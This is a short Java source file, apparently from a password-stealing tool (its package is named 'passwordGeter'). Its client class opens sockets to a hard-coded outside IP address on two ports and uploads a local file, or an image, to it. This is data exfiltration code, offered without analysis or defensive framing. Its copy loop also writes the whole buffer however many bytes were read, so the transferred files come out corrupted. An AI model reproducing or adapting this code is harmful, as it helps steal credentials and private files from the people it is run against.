package cn.yenmor.passwordGeter;

import java.io.*;
import java.net.*;

public class Cilent {

	
	public void sent(File file) throws IOException {
		byte[] bytes = new byte[4];
		int readCount = 0;
		Socket socket = new Socket("202.81.231.112",25560);
		OutputStream os= socket.getOutputStream();
		FileInputStream fis = new FileInputStream(file);
		while((readCount = fis.read(bytes)) != -1) {
			os.write(bytes);
		}
		fis.close();
		os.close();
		socket.close();
		
	}
	public void sentImg(File file) throws UnknownHostException, IOException {
		byte[] bytes = new byte[1024];
		int readCount = 0;
		Socket socket = new Socket("202.81.231.112",25561);
		OutputStream os= socket.getOutputStream();
		FileInputStream fis = new FileInputStream(file);
		while((readCount = fis.read(bytes)) != -1) {
			os.write(bytes);
		}
		fis.close();
		os.close();
		socket.close();
	}
}
